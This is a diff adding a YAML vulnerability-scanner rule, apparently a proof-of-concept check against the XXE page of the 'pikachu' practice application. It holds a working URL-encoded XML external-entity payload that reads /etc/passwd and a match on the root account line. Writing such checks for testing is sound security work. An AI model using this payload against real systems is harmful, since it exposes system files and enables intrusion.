@@ -1,0 +1,11 @@
+name: xxe-pikachu-post
+type: XXE
+rules:
+  - method: POST
+    path: vul/xxe/xxe_1.php
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+      Content-type: application/x-www-form-urlencoded
+    body: xml=%3c%3fxml+version+%3d+%221.0%22%3f%3e%3c%21DOCTYPE+note+%5b%3c%21ENTITY+hacker+SYSTEM+%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cname%3e%26hacker%3b%3c%2fname%3e&submit=%e6%8f%90%e4%ba%a4
+    expression: result.contains("root:x:0:0:root:/root")
+author: ch4ser
